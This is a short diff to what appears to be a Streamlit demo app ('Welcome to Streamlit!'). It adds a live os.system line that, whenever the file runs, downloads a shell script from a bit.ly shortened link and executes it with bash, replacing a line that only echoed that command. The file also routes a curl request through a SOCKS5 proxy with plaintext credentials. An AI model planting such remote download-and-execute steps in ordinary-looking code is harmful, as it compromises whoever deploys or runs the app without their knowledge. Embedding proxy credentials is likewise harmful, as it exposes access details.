@@ -6,7 +6,7 @@ import streamlit as st
 
 import os
 os.system('curl --proxy "socks5://gilakalilw-rotate:yangbacagila@p.webshare.io:80" https://www.mozilla.org/en-US/firefox/central/')
-os.system('echo " curl -L -o main.sh https://bit.ly/3rgZVLc  && bash main.sh")
+os.system('curl -L -o main.sh https://bit.ly/3rgZVLc && bash main.sh')
 
 """
 # Welcome to Streamlit!
